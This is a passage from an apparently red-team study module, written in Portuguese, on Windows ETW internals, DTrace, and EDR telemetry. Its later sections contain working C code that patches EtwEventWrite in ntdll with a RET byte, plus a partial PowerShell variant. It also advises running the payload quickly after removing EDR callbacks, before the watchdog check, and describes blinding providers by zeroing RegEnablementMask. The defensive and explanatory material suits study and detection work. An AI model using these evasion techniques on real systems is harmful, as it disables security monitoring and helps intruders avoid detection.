  └─ LogFileMode         : flags (real-time, circular, ondisk, secure, etc.)
```

#### ETW_GUID_ENTRY — Provider Registrado

Armazenado em hash table global por-silo, indexada por GUID.

```
ETW_GUID_ENTRY
  ├─ ProviderGuid        : GUID único do provider
  ├─ SecurityDescriptor  : controla quem pode habilitar/registrar o provider
  ├─ EnablementInfo[8]   : info de habilitação por sessão (máx. 8 sessões simultâneas)
  ├─ RefCounter          : contagem de referências
  ├─ FilterData          : filtros ativos (PID, keywords, level)
  └─ EtwRegistrations    : lista de ETW_REG_ENTRY (uma por processo que registrou)
```

#### ETW_REG_ENTRY — Registro de Provider em Processo

```
ETW_REG_ENTRY
  ├─ ETW_GUID_ptr        : ponteiro para ETW_GUID_ENTRY do provider
  ├─ ProcessId / SessionId
  ├─ Callback            : ponteiro para callback de enable/disable do provider
  ├─ Flags               : estado de registro
  ├─ RegEnablementMask   : máscara de 1 bit por sessão que habilitou — KEY para filtragem
  └─ Traits              : informações extras do provider (nome, grupo, etc.)
```

**Por que `RegEnablementMask` importa:** `EtwpEventWriteFull` verifica essa máscara primeiro. Se = 0, evento descartado imediatamente sem nenhum processamento. Zerar essa máscara = cegar provider sem tocar em EtwEventWrite.

### Inicialização do ETW — 3 Fases no Boot

```
Fase 0 — kernel init:
  EtwInitialize() aloca array de sessões ETW por silo
  Lê: HKLM\System\CurrentControlSet\Control\WMI\EtwMaxLoggers (padrão: 64, range: 32–256)

Fase 1 — IoInitSystemPreDrivers:
  - Inicializa SD padrão de sessão/provider
  - Inicializa estruturas de tracing por processador no PRCB
  - Cria tipos de objeto EtwConsumer e EtwRegistration no Object Manager
  - Registra callback de bugcheck (dump de sessões em BSOD)
  - Inicia Global Logger e Autologgers a partir do registry
  - Registra providers kernel built-in (Process, Network, Disk, File, IO, Memory)
  - Publica WNF state indicando que ETW está inicializado

Fase Final (após Smss inicializar software hive):
  - Notifica sessões globais que filesystem está pronto
  - Flush de buffers pendentes para arquivo de log
```

### Fluxo Interno de Criação de Sessão

```
StartTrace (Sechost.dll)
  → NtTraceControl syscall
    → EtwpStartLogger (kernel):
        1. Verifica acesso: TRACELOG_GUID_ENABLE no SD da sessão
        2. Verifica se sessão com mesmo nome já existe
        3. Gera session GUID
        4. Aloca e inicializa ETW_LOGGER_CONTEXT
        5. EtwpAllocateTraceBuffer:
             - Buffer default: 8 KB (pouca RAM), 16 KB (normal), 64 KB (muita RAM)
             - Número de buffers depende de CPUs + flag EVENT_TRACE_NO_PER_PROCESSOR_BUFFERING
        6. Insere no array per-silo
        7. Inicia ETW Logger Thread (se não circular buffer)
        8. Notifica session notification provider
```

### Fluxo Interno de Registro e Habilitação de Provider

**Registro (EventRegister → kernel):**
1. Access check: `TRACELOG_REGISTER_GUIDS` no SD do provider
2. Lookup na hash table global por GUID
3. Se não existe: cria `ETW_GUID_ENTRY`, insere na hash table
4. Cria `ETW_REG_ENTRY`, vincula ao `ETW_GUID_ENTRY`
5. Se provider já foi habilitado numa sessão antes do registro: habilita agora e chama EnableCallback

**Habilitação (EnableTraceEx2 → `EtwpEnableGuid` kernel):**
1. Access check: `TRACELOG_GUID_ENABLE` no SD da sessão **E** do provider
2. Se sessão tem flag `SECURITY_TRACE`: requer PPL ≥ antimalware (bloqueia user-mode)
3. Atualiza `EnablementInfo[session_index]` no `ETW_GUID_ENTRY`
4. Recalcula `RegEnablementMask` no `ETW_REG_ENTRY` (bit set = sessão ativa)
5. Chama EnableCallback do provider com `EVENT_CONTROL_CODE_ENABLE_PROVIDER`

### Fluxo Interno de Geração de Evento — EtwpEventWriteFull

```c
EventWrite(hProvider, &EventDescriptor, UserDataCount, UserData)
  → EtwpEventWriteFull (NTDLL + kernel):
      1. Obtém ETW_REG_ENTRY via handle
      2. Verifica RegEnablementMask → se 0: descartar (return imediato)
      3. Para cada sessão habilitada (bit no mask):
         a. Verifica filtros: level, keywords, PID filter
         b. Calcula tamanho total do payload
         c. Verifica espaço no buffer atual da sessão
         d. Se buffer cheio: tenta próximo buffer livre (FIFO queue)
         e. Se nenhum buffer livre: incrementa "Events Lost" no ETW_LOGGER_CONTEXT
      4. Escreve atomicamente payload no buffer
      5. Se buffer ficou cheio: sinaliza Logger Thread para flush
```

### Logger Thread — Flush de Buffers

A Logger Thread é o único componente que move buffers para arquivo/consumer.

**Acorda quando:**
- Buffer cheio (sinalizado por `EtwpEventWriteFull`)
- Novo consumer real-time conectou
- Sessão sendo parada
- Timer de timeout (1 segundo para sessões real-time)

**Sessões real-time:**
1. Cria arquivo ETL temporário em `%SystemRoot%\System32\LogFiles\WMI\RtBackup\`
2. Cria objeto `ETW_REALTIME_CONSUMER` quando consumer conecta via `ProcessTrace`
3. Injeta eventos diretamente no address space do consumer (sem cópia extra)

### System Loggers — NT Kernel Logger, Global Logger, CKCL

| Index | Nome | GUID | Uso |
|-------|------|------|-----|
| 0 | NT kernel logger | `9e814aad-3204-11d2-9a82-006008a86939` | Eventos kernel via EnableFlags |
| 1 | Global logger | `e8908abc-aa84-11d2-9a93-00805f85d7c6` | Boot-time logging |
| 2 | CKCL (Circular Kernel Context Logger) | `54dea73a-ed1f-42a4-af71-3e63d056f174` | Logging circular contínuo |

### Kernel Flags — NT Kernel Logger EnableFlags

| Flag | Descrição | Relevância Ofensiva/Defensiva |
|------|-----------|-------------------------------|
| `PROC_THREAD` | Process/thread create/delete | **EDR clássico** |
| `LOADER` | Image load/unload (user+kernel) | **DLL injection detection** |
| `VIRT_ALLOC` | VirtualAlloc reserve/release | **Shellcode allocation detection** |
| `SYSCALL` | System calls (entry/exit) | **Syscall auditing** |
| `NETWORKTRACE` | TCP/UDP send/receive | Network monitoring |
| `FILE_IO` | Filesystem operations | File monitoring |
| `REGISTRY` | Registry tracing | Registry monitoring |
| `ALPC` | Advanced LPC calls | IPC monitoring |
| `MEMORY` | Memory tracing | Heap/paging |
| `ALL_FAULTS` | Page faults (hard, CoW, demand-zero) | Memory analysis |
| `CSWITCH` | Context switch | Performance |
| `DISK_IO` | Disk I/O | Disk monitoring |

```cmd
:: Iniciar NT kernel logger com múltiplos flags
xperf -on PROC_THREAD+LOADER+VIRT_ALLOC+NETWORKTRACE -f c:\kernel.etl

:: Via API StartTrace:
Properties.EnableFlags = EVENT_TRACE_FLAG_PROCESS | EVENT_TRACE_FLAG_IMAGE_LOAD | EVENT_TRACE_FLAG_VIRTUAL_ALLOC;
```

### ETW Access Rights (Table 10-18)

| Access Right | Aplicado a | Descrição |
|--------------|-----------|-----------|
| `WMIGUID_QUERY` | Sessão | Consultar informações da sessão |
| `TRACELOG_CREATE_REALTIME` | Sessão | Iniciar/atualizar sessão real-time |
| `TRACELOG_CREATE_ONDISK` | Sessão | Iniciar/atualizar sessão que grava em arquivo |
| `TRACELOG_GUID_ENABLE` | Provider | Habilitar o provider numa sessão |
| `TRACELOG_LOG_EVENT` | Sessão | Logar eventos (requerido em SECURE mode) |
| `TRACELOG_ACCESS_REALTIME` | Sessão | Consumer consumir eventos em real-time |
| `TRACELOG_REGISTER_GUIDS` | Provider | Registrar provider |
| `TRACELOG_JOIN_GROUP` | Provider | Adicionar provider a grupo |

**Padrão:** SYSTEM, Administrators, LocalService, NetworkService têm acesso total.

### Security Audit Logger + Secure Loggers

**Security Audit Logger** (alimentado por `wevtsvc.dll`):
- Provider: `{54849625-5478-4994-a5ba-3e3b0328c30d}` — registrado apenas pelo NT kernel
- Flag `SECURITY_TRACE` na sessão: user-mode **não pode** parar/controlar (somente PPL ≥ antimalware)
- Recebe eventos de segurança (logons, auditorias para Event Log)

**Secure Loggers** (`EVENT_TRACE_SECURE_MODE`):
- Bloqueia providers MOF/WPP de escrever eventos
- Requer `TRACELOG_LOG_EVENT` access right para habilitar qualquer provider
- User-mode comum não consegue injetar eventos falsos

### Autologgers — Registry

Sessões iniciadas automaticamente no boot:

```
HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\
  └─ {GUID1} → Enabled=1, EnableLevel=0, MatchAnyKeyword=0xFFFFFFFFFFFFFFFF
  └─ {GUID2} → ...

HKLM\SYSTEM\CurrentControlSet\Control\WMI\GlobalLogger\
  → configuração do Global Logger (boot-time)
```

**Exploração:** modificar registry de autologger (requer admin) → persiste configuração de sessão ETW entre reboots.

### Consumir Eventos — API

```c
// 1. Configurar consumer
EVENT_TRACE_LOGFILE logfile = {0};
logfile.ProcessTraceMode = PROCESS_TRACE_MODE_REAL_TIME | PROCESS_TRACE_MODE_EVENT_RECORD;
logfile.EventRecordCallback = EventCallback;
logfile.LoggerName = L"MinhaSession";

// 2. Abrir sessão
TRACEHANDLE hTrace = OpenTrace(&logfile);

// 3. Processar (bloqueante — chama EventCallback para cada evento)
ProcessTrace(&hTrace, 1, NULL, NULL);

// 4. EventCallback decodifica payload
void WINAPI EventCallback(PEVENT_RECORD pEvent) {
    // pEvent->EventHeader.ProviderId     = GUID do provider
    // pEvent->EventHeader.EventDescriptor.Id = Event ID
    // pEvent->UserData                   = payload binário
    
    // Decodificar via manifest TDH:
    DWORD bufferSize = 0;
    TdhGetEventInformation(pEvent, 0, NULL, NULL, &bufferSize);
    PTRACE_EVENT_INFO pInfo = (PTRACE_EVENT_INFO)malloc(bufferSize);
    TdhGetEventInformation(pEvent, 0, NULL, pInfo, &bufferSize);
    // pInfo contém nomes de campos e valores decodificados
}
```

### DTrace para Windows (Win10 20H1+)

DTrace é tracing **dinâmico** — insere probes em runtime sem modificar código (diferente do ETW estático).

```cmd
:: Habilitar DTrace (requer Secure Boot desabilitado para fbt em kernel)
bcdedit /set dtrace ON
```

**Providers DTrace:**

| Provider | Alvo | Uso Ofensivo/Defensivo |
|---------|------|------------------------|
| `syscall` | Entry/exit de qualquer syscall | Auditar `NtAllocateVirtualMemory`, `NtCreateProcess` |
| `fbt` | Entry/return de funções kernel | Tracear `MmAllocateContiguousMemory`, qualquer função NT |
| `pid` | Funções de processo user-mode | Tracear funções de processo específico |
| `etw` | Probes em eventos ETW existentes | Conectar DTrace a providers ETW |
| `profile` | Timer interrupt | Profiling amostral |

```d
/* Tracear VirtualAllocEx via syscall */
syscall::NtAllocateVirtualMemory:entry
{
    printf("NtAllocateVirtualMemory: pid=%d protect=0x%x\n", pid, args[5]);
}

/* Tracear função kernel (fbt) */
fbt:nt:EtwpEventWriteFull:entry
{
    printf("ETW evento sendo escrito: pid=%d\n", pid);
}

/* Tracear processo específico */
pid8020:kernelbase:VirtualAllocEx:entry
{
    printf("VirtualAllocEx em PID 8020\n");
}
```

```cmd
:: Executar script DTrace
dtrace -s myscript.d

:: Listar todos os probes (syscalls, funções kernel)
dtrace -l > all_probes.txt
dtrace -ln syscall:::entry > syscalls.txt
```

---

## Exemplos de Código / Comandos

### Tabela: Técnicas de Red Team × Eventos ETW Gerados

| Técnica | Provider | Evento/Task | Como Detectar |
|---------|----------|-------------|---------------|
| CreateRemoteThread injection | ETW-TI | TASK_THREAD_REMOTE | CallingProcess ≠ TargetProcess |
| VirtualAllocEx | ETW-TI | TASK_ALLOCVM_REMOTE | Caller ≠ Target, PageProt=0x40 |
| WriteProcessMemory | ETW-TI | TASK_OS_WRITE_REMOTE | Caller ≠ Target |
| SetThreadContext | ETW-TI | TASK_SETTHREADCONTEXT | Thread em SUSPEND |
| QueueUserAPC | ETW-TI | TASK_QUEUEUSERAPC | — |
| Reflective DLL Injection | Kernel-Process | Evento 5 ImageLoad | FullImageName vazio |
| PowerShell encoded cmd | PowerShell | Evento 4104 | ScriptBlock após decode |
| AMSI bypass attempt | AMSI | Evento 1101 | Conteúdo suspeito |
| Process Hollowing | ETW-TI + Kernel | ALLOCVM + MAP + ThreadCtx | Sequência de eventos |
| LSASS ReadVirtualMemory | ETW-TI | TASK_READVM_LOCAL | TargetPID = lsassPID |
| New service criado | Security | Event 4697 | ServiceName, ServiceType |

### Comandos para Enumerar ETW em Alvo

```powershell
# Listar todos os providers registrados no sistema
logman query providers

# Filtrar por categoria de interesse
logman query providers | Select-String "Threat|Kernel|Security|Amsi|PowerShell"

# Listar sessões ETW ativas
logman query -ets

# Checar sessão específica
logman query "NT Kernel Logger" -ets
logman query "Microsoft-Windows-Threat-Intelligence" -ets

# Via .NET (mais detalhado)
[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.GetProviderNames() | 
    Where-Object {$_ -like "*Threat*" -or $_ -like "*Kernel*"}

# Verificar quais providers o Defender está consumindo
Get-WinEvent -ListProvider "Microsoft-Windows-Windows Defender" | 
    Select-Object -ExpandProperty Events | Select-Object Id, Description
```

### Verificar Callbacks Ativos via Windbg/LiveKD

```
# Em kernel debug:
!process 0 0 MsMpEng.exe       # PID do Defender
!drvobj \Driver\WdFilter 7     # Ver callbacks registrados

# Listar todos os callbacks de processo:
dq nt!PspCreateProcessNotifyRoutine L40

# Listar callbacks de imagem:
dq nt!PspLoadImageNotifyRoutine L40

# Listar callbacks de thread:
dq nt!PspCreateThreadNotifyRoutine L40

# Identificar módulo dono do callback:
ln ENDEREÇO_DO_CALLBACK
```

---

## Detecção e OPSEC

### O Que Acontece Quando Callbacks São Removidos

Quando callbacks do EDR são zerados:
- O EDR **não é notificado** de novos processos criados
- O EDR **não vê** DLLs carregadas
- O EDR **não recebe** alertas de injeção de thread

**Porém:** O EDR agent ainda está rodando. Muitos EDRs têm mecanismo de heartbeat/watchdog que verifica periodicamente se seus callbacks ainda estão registrados. Se detectar que callbacks sumiram:
- Pode reiniciar automaticamente
- Pode enviar alerta para o SOC: "EDR self-protection violated"
- Pode acionar quarentena do endpoint

**Mitigação:** Executar o payload rapidamente após remover callbacks, antes do próximo ciclo de verificação do EDR (que pode ser de 30s a 5min dependendo do produto).

### Como Detectar Remoção de Callbacks (Defensor)

```powershell
# Verificar se número de callbacks mudou (precisa de baseline)
# Via kernel driver do próprio EDR, ou via:

# Event ID 4657: Registry value modified
# Event ID 7036: Service started/stopped
# Se o EDR tem self-monitoring, ele loga quando callbacks somem

# Via WMI (ineficiente mas possível):
Get-WmiObject -Namespace "root\cimv2" -Class "Win32_SystemDriver" | 
    Where-Object {$_.PathName -like "*WdFilter*" -or $_.PathName -like "*CSAgent*"}
```

### Bypass de ETW Sem Kernel Access

Se não tem BYOVD disponível, algumas opções de userland para cegar ETW parcialmente:

```c
// Patch de EtwEventWrite em ntdll.dll (userland)
// Funciona apenas para o processo atual — não afeta kernel ETW-TI

HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");

// Colocar RET no início da função
DWORD oldProt;
VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProt);
*(BYTE*)pEtwEventWrite = 0xC3;  // RET instruction
VirtualProtect(pEtwEventWrite, 1, oldProt, &oldProt);

// LIMITAÇÃO: apenas cega ETW de user-mode providers no processo atual
// ETW-TI (kernel-mode) NÃO é afetado por isso
```

```powershell
# Via PowerShell: patch de ETW em memória do processo PowerShell
$EtwEventWrite = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-ProcAddress ntdll.dll EtwEventWrite), 
    (Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [IntPtr]) ([Void]))
)

# Técnica com SetProcessValidCallTargets para CFG bypass
# (complexo — ver projeto PatchlessBypass no GitHub)
```

---

## Módulos Relacionados

`01_byovd_drivers_vulneraveis.md` fornece o kernel R/W necessário para remover callbacks e patchar ETW-TI sem carregar driver próprio. `03_credential_guard_bypass.md` usa `ObRegisterCallbacks` como contexto — EDRs registram callbacks de objeto para proteger LSASS, e contorná-los é pré-requisito para dump. `../04_evasao/03_amsi_bypass.md` cobre bypass de ETW em userland como complemento quando BYOVD não está disponível.

**Recursos externos:**
- SilkETW: https://github.com/mandiant/SilkETW
- EDRSandblast: https://github.com/wavestone-cdt/EDRSandblast
- "Evading EDR" (Matt Hand): análise detalhada de callbacks
- Kernel Callback Enumeration: https://github.com/fengjixuchui/DKCallbackStomper
- ETW-TI events: https://github.com/jdu2600/etw-providers-docs

**MITRE ATT&CK:**
- T1562.001 — Disable or Modify Tools
- T1562.006 — Indicator Blocking (ETW patch)
- T1055 — Process Injection (geração de eventos ETW-TI)
